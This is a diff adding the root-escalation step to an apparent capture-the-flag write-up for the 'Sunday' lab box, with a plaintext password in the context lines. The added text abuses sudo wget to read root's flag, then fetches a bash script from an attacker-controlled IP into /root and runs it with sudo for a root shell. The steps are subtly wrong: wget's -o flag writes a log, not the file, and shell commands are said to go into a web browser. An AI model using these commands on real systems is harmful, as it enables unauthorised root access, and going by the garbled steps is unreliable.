@@ -40,5 +40,33 @@ password : cooldude!
 
 ![Sunday_user_flag](https://user-images.githubusercontent.com/55708909/91529213-85bce680-e926-11ea-88dc-c922dfa5bdc5.png)
 
+![Sunday_root](https://user-images.githubusercontent.com/55708909/91529732-74280e80-e927-11ea-881e-62088329d171.png)
+
+
+First i check the sudo right for sammy and found out he has wget right i remember it can print the output of any files even restricted ones
+
+sudo /usr/bin/wget -i /root/root.txt
+
+But i am greedy and want full control over p.c. so i combine both of sudo right for sunny and sammy
+
+Prepare troll files with contents:
+
+troll
+
+#!/bin/bash
+
+bash
+
+
+Fire up the web browser and type following commnads:
+
+sudo /usr/bin/wget -o /root/troll http://10.10.14.6/troll
+
+and againg log into sysytem as sunny and type sudo /root/troll
+
+you will be root
+
+![Sunday_root](https://user-images.githubusercontent.com/55708909/91529732-74280e80-e927-11ea-881e-62088329d171.png)
+
 
 
